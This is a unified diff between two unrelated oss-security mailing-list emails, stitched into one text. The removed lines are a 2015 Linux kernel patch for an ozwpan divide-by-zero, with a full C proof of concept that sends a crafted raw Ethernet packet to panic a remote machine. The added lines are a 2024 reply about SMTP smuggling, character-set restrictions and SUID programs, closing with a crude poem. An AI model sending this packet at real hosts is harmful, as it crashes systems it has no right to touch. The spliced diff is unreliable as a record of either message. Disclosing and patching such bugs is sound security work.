@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["4357" "Wednesday" "13" "May" "2015" "20:33:33" "+0200" "Jason A. Donenfeld" "Jason@zx2c4.com" "<1431542014-3239-4-git-send-email-Jason@zx2c4.com>" "174" "[oss-security] [PATCH 3/4] ozwpan: divide-by-zero leading to panic" nil nil nil "5" "2015051318:33:33" "[oss-security] [PATCH 3/4] ozwpan: divide-by-zero leading to panic" (number mark "U       Jason@zx2c4. May 13  174/4357  " thread-indent "\"[oss-security] [PATCH 3/4] ozwpan: divide-by-zero leading to panic\"\n") "<1431542014-3239-1-git-send-email-Jason@zx2c4.com>" ("<1431542014-3239-1-git-send-email-Jason@zx2c4.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0000
-X-Mozilla-Status2: 00000000
-Received: (qmail 5996 invoked by uid 550); 13 May 2015 18:35:07 -0000
+Received: (qmail 5583 invoked by uid 550); 2 May 2024 19:38:38 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,199 +7,184 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 3832 invoked from network); 13 May 2015 18:34:41 -0000
-DKIM-Signature: v=1; a=rsa-sha1; c=relaxed; d=zx2c4.com; h=from:to:cc
-	:subject:date:message-id:in-reply-to:references; s=mail; bh=+kWb
-	wwChoH/eFz4bXWC6JJxM5y8=; b=Vm/J3ZGPyQLd3ZF+/OaZWDxjWB59Ij+J+NQg
-	zO4gAv2cCzGd/AYiEMRK5quAewrSBAHQuW8SaXhc+0SdrVgnkPXYtHeCnyKvS1hL
-	x4Kt00gitPkiMZcTZI/w5Kll3H6nGI7K1Om/FlkV7kNXjzRutBxvXFCwaSxw23wo
-	CXIVC/LoMb6uMm+xKa30/AvhBFcNQpQx2/kRknMJQZvflEbY/0+G4nFBN/IxvKw0
-	dkBiVr069Ay6l0dtTXFPIiTM171fyVATgP5yfDOYCCLS/qOHpWUyIf+GVVy96uYz
-	V1DDG+RYcbtFhilHyrI/jUJe8QphsIdO1w1zm66gcWVR28F3Bg==
-From: "Jason A. Donenfeld" <Jason@zx2c4.com>
-To: shigekatsu.tateno@atmel.com,
-	linux-kernel@vger.kernel.org,
-	netdev@vger.kernel.org,
-	oss-security@lists.openwall.com
-Cc: "Jason A. Donenfeld" <Jason@zx2c4.com>
-Date: Wed, 13 May 2015 20:33:33 +0200
-Message-Id: <1431542014-3239-4-git-send-email-Jason@zx2c4.com>
-X-Mailer: git-send-email 2.3.6
-In-Reply-To: <1431542014-3239-1-git-send-email-Jason@zx2c4.com>
-References: <1431542014-3239-1-git-send-email-Jason@zx2c4.com>
-Subject: [oss-security] [PATCH 3/4] ozwpan: divide-by-zero leading to panic
+Received: (qmail 31925 invoked from network); 2 May 2024 18:21:56 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=sdaoden.eu;
+ s=citron; t=1714674108; x=1715340774; h=date:author:from:to:subject:
+  message-id:in-reply-to:references:mail-followup-to:openpgp:blahblahblah:
+  author:from:subject:date:to:cc:resent-date:resent-from:resent-to:
+  resent-cc:in-reply-to:references:mime-version:content-type:
+  content-transfer-encoding:message-id:mail-followup-to:openpgp:
+  blahblahblah; bh=gLqGBMUHp+s6z9fIbumakU+gPtYtWKufkoxhnbXecUI=;
+ b=eohKQT3jqQ4tA1oFFheZLml2I2jRSPBe3uhKDS3HiNMSMjoCOIDB8Eiy2o414L/T4+6R1S1N
+  NdqcFrypNaR3/kkRPpEKrH1J3jJjnOhklW9wCfsCHaCR8IgVMhGsNqV1b15dEBw//6cqoFRyTb
+  vJQws+1+ObH+WudwVbC8SaKg08HeSIbtZmdecOPRWyhyqcx98CgXZY3CL5yKLDO2tn0Dx7jPzy
+  CZ71lw9bMjjOPl2vVtefGFNNAu2u0nDxjNdkwdrwB21CGJ4aKZNI8UKhd5CmvuHhfptvjGGvph
+  UiMQfrJumAxb2XVEkjp9KOcFVS+3g0yLmRR8vkuhnhRFnbUA==
+DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=sdaoden.eu;
+ s=orange; t=1714674108; x=1715340774; h=date:author:from:to:subject:
+  message-id:in-reply-to:references:mail-followup-to:openpgp:blahblahblah:
+  author:from:subject:date:to:cc:resent-date:resent-from:resent-to:
+  resent-cc:in-reply-to:references:mime-version:content-type:
+  content-transfer-encoding:message-id:mail-followup-to:openpgp:
+  blahblahblah; bh=gLqGBMUHp+s6z9fIbumakU+gPtYtWKufkoxhnbXecUI=;
+ b=72jfL/E6grM5HLzSKuc4wQhxZJn9t+uz0rgsm4JyIWvIBQcoDCttGqyWKX1YyvTByet7ODjL
+  50FHxsIfcjVrBQ==
+Date: Thu, 02 May 2024 20:21:46 +0200
+Author: Steffen Nurpmeso <steffen@sdaoden.eu>
+From: Steffen Nurpmeso <steffen@sdaoden.eu>
+To: oss-security@lists.openwall.com
+Message-ID: <20240502182146.ygWZjB-Z@steffen%sdaoden.eu>
+In-Reply-To: <20240430224823.uA8Nr1Cp@steffen%sdaoden.eu>
+References: <20231221143630.GD14101@suse.de> <ZjBHOEHylGAaIo57@moon>
+ <20240430224823.uA8Nr1Cp@steffen%sdaoden.eu>
+Mail-Followup-To: oss-security@lists.openwall.com
+User-Agent: s-nail v14.9.24-621-g0d1e55f367
+OpenPGP: id=EE19E1C1F2F7054F8D3954D8308964B51883A0DD;
+ url=https://ftp.sdaoden.eu/steffen.asc; preference=signencrypt
+BlahBlahBlah: Any stupid boy can crush a beetle. But all the professors in
+ the world can make no bugs.
+Subject: Re: [oss-security] New SMTP smuggling attack
 
-A network supplied parameter was not checked before division, leading to
-a divide-by-zero. Since this happens in the softirq path, it leads to a
-crash. A PoC follows below, which requires the ozprotocol.h file from
-this module.
+Please let me elaborate a little more on this, not to be
+misunderstood and also..
 
-=-=-=-=-=-=
+Steffen Nurpmeso wrote in
+ <20240430224823.uA8Nr1Cp@steffen%sdaoden.eu>:
+ |Mark Esler wrote in
+ | <ZjBHOEHylGAaIo57@moon>:
+ ||To mitigate future end-of-data sequence attacks, like SMTP Smuggling, MTAs
+ ||should comply with RFC 5321 section 4.1.1.4 [0] to strip control
+ ||characters other than <SP>, <HT>, <CR>, and <LF> in the DATA section of
+ ||SMTP messages.
+ |
+ |Given that RFC 733 is from 1977 and RFC 822 is from 1982 i feel
+ |this entire thread is exaggerating.
+ |
+ |The smuggling problem solely was rooted in the LF / CRLF "wars"
+ |from at minimum the early 70s (Unix and more), with terminal
+ |drivers doing auto-translation on-the-fly etc etc etc.
+ ..
+ |[.]Ie, in January i also (funny)
+ |talked to John Klensin on an IETF list saying
+ |
+ |  [.]The CR/LF "problem" seems to have been "addressed" in
+ |  UNIX as early as 1972, ie "6/12/72 STTY (II)" gives
+ ...
+ |  In 1974 it became
+ ...
+ |    -nl allow carriage return for new-line,
+ |        and output CR-LF for carriage return or new-line
+ |    nl  accept only new-line to end lines
+ ...
 
- #include <arpa/inet.h>
- #include <linux/if_packet.h>
- #include <net/if.h>
- #include <netinet/ether.h>
- #include <stdio.h>
- #include <string.h>
- #include <stdlib.h>
- #include <endian.h>
- #include <sys/ioctl.h>
- #include <sys/socket.h>
+..because two drafts on character set cramping circulate in the
+IETF (of which i am not a representative (member), just like i do
+not use airplanes in my adult life, eat meat etcetc).  For one
+there is draft-bormann-dispatch-modern-network-unicode, and there
+is another one by the writer of the (uh! horror!) JSON RFC 8259.
 
- #define u8 uint8_t
- #define u16 uint16_t
- #define u32 uint32_t
- #define __packed __attribute__((__packed__))
- #include "ozprotocol.h"
+I myself oppose any such cramping in general, and do not
+understand their usefulness.  I said, yes, if you cat(1) such
+a file to a UNIX terminal [..you can think the rest..].  (There is
+btw "cat -vet", which i do not deem harmful in that sense.)  In
+general Unicode also has the "SYMBOL FOR [ascii-control]" range to
+visualize controls, at U+2400 ff., it seems is not widely known.
 
-static int hex2num(char c)
-{
-	if (c >= '0' && c <= '9')
-		return c - '0';
-	if (c >= 'a' && c <= 'f')
-		return c - 'a' + 10;
-	if (c >= 'A' && c <= 'F')
-		return c - 'A' + 10;
-	return -1;
-}
-static int hwaddr_aton(const char *txt, uint8_t *addr)
-{
-	int i;
-	for (i = 0; i < 6; i++) {
-		int a, b;
-		a = hex2num(*txt++);
-		if (a < 0)
-			return -1;
-		b = hex2num(*txt++);
-		if (b < 0)
-			return -1;
-		*addr++ = (a << 4) | b;
-		if (i < 5 && *txt++ != ':')
-			return -1;
-	}
-	return 0;
-}
+To make it short, if you have some protocol or media type
+somewhere, you define its semantics, and those can be whatever is
+needed or desired.  For example if you mutilate somewhat user
+friendly SGML to XML, you can restrict the available code points:
+they did, and so you cannot represent the entire possible range of
+filenames of neither POSIX nor Windows with XML.
 
-int main(int argc, char *argv[])
-{
-	if (argc < 3) {
-		fprintf(stderr, "Usage: %s interface destination_mac\n", argv[0]);
-		return 1;
-	}
+But, i said, a *general* restriction of the range of code points,
+what should this be good for.  For example SMTP can transport all
+these for many decades, and it works a billion times each day;
+today mostly MIME content-transfer-encoding is applied though, and
+Unicode aware applications either show those "this-font-has-that-
+codepoint-NOT" boxes (no normal user gets that btw), or the symbol
+as such, *even for control codes*, as above, for example U+2400
+for NUL (Unicode NULL).
+Yes, i mean, a program must deal with it, the one way or the
+other.  Has someone tested how many XML programs for example
+adhere to the standardized range of allowed code points.
+Bugs and logical errors also exist everywhere, the rust of it.
+Etc etc.  A control character is nothing special.
+See, with JSON, for example, you get surrogates encoded as UTF-8
+which is a totally forbidden thing according to Unicode, and any
+poor conforming UTF-8 decoder has to deal with that mess if really
+JSON has to be used for K=V\0K=V\0\0 value lists.
 
-	uint8_t dest_mac[6];
-	if (hwaddr_aton(argv[2], dest_mac)) {
-		fprintf(stderr, "Invalid mac address.\n");
-		return 1;
-	}
+Anyway, there was a pretty good discussion in October last year
+(on art AT IETF), and to my suprise again in March, somehow not
+taking into account many items raised in last October.
+Any i very much liked the actual IETF session for which dozens of
+people flew hundreds of thousands of kilometres to Brisbane in
+Australia, and Rob Sayre of i think Mozilla thankfully posted an
+URL to the correct timeline position
 
-	int sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
-	if (sockfd < 0) {
-		perror("socket");
-		return 1;
-	}
+  https://youtu.be/bPNRO2HYITg?si=zyWwK26TqYel7mRT&t=6684
 
-	struct ifreq if_idx;
-	int interface_index;
-	strncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1);
-	if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {
-		perror("SIOCGIFINDEX");
-		return 1;
-	}
-	interface_index = if_idx.ifr_ifindex;
-	if (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) {
-		perror("SIOCGIFHWADDR");
-		return 1;
-	}
-	uint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data;
+I very much agree with all the people in the crowd ("define
+a profile!"), and i loved the one who said something like
+"presentation is fantastic, conclusions are not".
+No people, that not.
 
-	struct {
-		struct ether_header ether_header;
-		struct oz_hdr oz_hdr;
-		struct oz_elt oz_elt;
-		struct oz_elt_connect_req oz_elt_connect_req;
-		struct oz_elt oz_elt2;
-		struct oz_multiple_fixed oz_multiple_fixed;
-	} __packed packet = {
-		.ether_header = {
-			.ether_type = htons(OZ_ETHERTYPE),
-			.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },
-			.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
-		},
-		.oz_hdr = {
-			.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),
-			.last_pkt_num = 0,
-			.pkt_num = htole32(0)
-		},
-		.oz_elt = {
-			.type = OZ_ELT_CONNECT_REQ,
-			.length = sizeof(struct oz_elt_connect_req)
-		},
-		.oz_elt_connect_req = {
-			.mode = 0,
-			.resv1 = {0},
-			.pd_info = 0,
-			.session_id = 0,
-			.presleep = 0,
-			.ms_isoc_latency = 0,
-			.host_vendor = 0,
-			.keep_alive = 0,
-			.apps = htole16((1 << OZ_APPID_USB) | 0x1),
-			.max_len_div16 = 0,
-			.ms_per_isoc = 0,
-			.up_audio_buf = 0,
-			.ms_per_elt = 0
-		},
-		.oz_elt2 = {
-			.type = OZ_ELT_APP_DATA,
-			.length = sizeof(struct oz_multiple_fixed)
-		},
-		.oz_multiple_fixed = {
-			.app_id = OZ_APPID_USB,
-			.elt_seq_num = 0,
-			.type = OZ_USB_ENDPOINT_DATA,
-			.endpoint = 0,
-			.format = OZ_DATA_F_MULTIPLE_FIXED,
-			.unit_size = 0,
-			.data = {0}
-		}
-	};
 
-	struct sockaddr_ll socket_address = {
-		.sll_ifindex = interface_index,
-		.sll_halen = ETH_ALEN,
-		.sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
-	};
+While (presumably) here, i also dislike that demonization of SUID
+programs currently on the table again.  Is it really so much safer
+and better to have some program talk to an all-capable
+super-daemon via IPC, which then starts another program with the
+desired "environment", instead of having a program like "super"
+(which somehow disappeared somewhen after Y2K?), "sudo" or "doas"
+(what i now use because my needs are very small minded, and i use
+scripts which do the real work, for example
 
-	if (sendto(sockfd, &packet, sizeof(packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
-		perror("sendto");
-		return 1;
-	}
-	return 0;
-}
+  $ sed '/^$/d;/^#/d' < /etc/doas.conf | wc -l
+  14
+..
+  permit nopass nolog keepenv setenv { -SSH_AGENT_PID -SSH_AUTH_SOCK } :shared as root cmd /x/pub/box-web.sh
+->
+  [ $(id -u) -ne 0 ] && exec ${SUPER} /x/pub/box-web.sh "${@}"
+  runit "${@}"
+->
+                boxit ${action} </dev/null >/dev/null 2>&1 &
+->
+        cd /
+        ip netns exec ${netns} \
+                /usr/bin/env -i AUTHDISPLAY=${AUTHDISPLAY} DISPLAY=${DISPLAY} TERM=${TERM} XAUTHORITY=${XAUTHORITY} \
+                        /usr/bin/unshare --ipc --uts --pid --fork --mount --mount-proc ${kill_child} ${rooter} ${prog} &
+        pid=${!}
+        [ -d /sys/fs/cgroup/_box_web ] && printf '%s\n' ${pid} > /sys/fs/cgroup/_box_web/cgroup.procs
 
-Signed-off-by: Jason A. Donenfeld <Jason@zx2c4.com>
----
- drivers/staging/ozwpan/ozusbsvc1.c | 5 ++++-
- 1 file changed, 4 insertions(+), 1 deletion(-)
+A bit racy, unfortunately.  I mean, if you *design* a SUID
+program, and it sets up things (clearing environment, closing
+FDs..), and then looses privileges, how is that worse?  Where is
+the attack surface?  Parsing the configuration file maybe, and you
+*could* outsource that into a dedicated subprocess and talk with
+that via IPC.
 
-diff --git a/drivers/staging/ozwpan/ozusbsvc1.c b/drivers/staging/ozwpan/ozusbsvc1.c
-index cd6c63e..2e67956 100644
---- a/drivers/staging/ozwpan/ozusbsvc1.c
-+++ b/drivers/staging/ozwpan/ozusbsvc1.c
-@@ -326,7 +326,10 @@ static void oz_usb_handle_ep_data(struct oz_usb_ctx *usb_ctx,
- 			struct oz_multiple_fixed *body =
- 				(struct oz_multiple_fixed *)data_hdr;
- 			u8 *data = body->data;
--			int n = (len - sizeof(struct oz_multiple_fixed)+1)
-+			int n;
-+			if (!body->unit_size)
-+				break;
-+			n = (len - sizeof(struct oz_multiple_fixed)+1)
- 				/ body->unit_size;
- 			while (n--) {
- 				oz_hcd_data_ind(usb_ctx->hport, body->endpoint,
--- 
-2.3.6
+I need ping sometimes, i need video and audio access, and "my"
+user is in the necessary groups; whether some super-server allows
+some other non-SUID program to access those via some configuration
+file somewhere, or whether normal (searchable) UNIX
+user/group[/capability] credentials are used to control access to
+a carefully designed and audited SET[GU]ID binary that creates
+a ping socket / opens an audio device and ioctl-inits it etc etc,
+before it once and for all drops those privileges.
 
+I think it is unfair to compare programs which have decades of
+history, which where developed in a software world where maybe
+OpenSSL already existed, like surely malicious actors, too, but in
+a completely different mental set without the experience of mass
+surveillance and mass exploits etc etc.  If you want to demonize,
+demonize that, not programs like sudo; not to mention that in
+order to support the configurability friendliness of sudo, any
+other implementation had to go a long road.
+
+--steffen
+|
+|Der Kragenbaer,                The moon bear,
+|der holt sich munter           he cheerfully and one by one
+|einen nach dem anderen runter  wa.ks himself off
+|(By Robert Gernhardt)
